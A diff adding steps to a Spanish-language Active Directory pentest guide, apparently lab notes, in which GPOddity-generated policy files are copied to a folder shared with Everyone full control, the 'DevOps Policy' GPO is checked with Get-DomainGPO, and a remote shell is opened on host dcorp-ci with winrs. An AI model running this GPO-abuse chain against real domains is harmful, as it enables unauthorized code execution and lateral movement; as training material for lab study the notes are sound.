@@ -259,6 +259,26 @@ Desde otra sesion de WSL deberemos de crear un directorio con el mismo nombre in
 mkdir /mnt/c/AD/Tools/stdx-gp
 ```
 
+Y compartirlo a una ruta conocida
+```shell
+cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/stdx-gp
+```
+
+Desde una CMD como Administrator debremos de darle permisos a ese carpeta comaprtida
+```shell
+net share stdX-gp=C:\AD\Tools\stdX-gp /grant:Everyone,Full
+icacls "C:\AD\Tools\stdX-gp" /grant Everyone:F /T
+```
+
+Y verificar si la carpeta esta dentro de la politica
+```shell
+Get-DomainGPO -Identity 'DevOps Policy'
+```
+
+Si la politica se ha aplicado correctamente podremos acceder a la maquina
+```shell
+winrs -r:dcorp-ci cmd
+```
 
 ## Movimiento Lateral
 
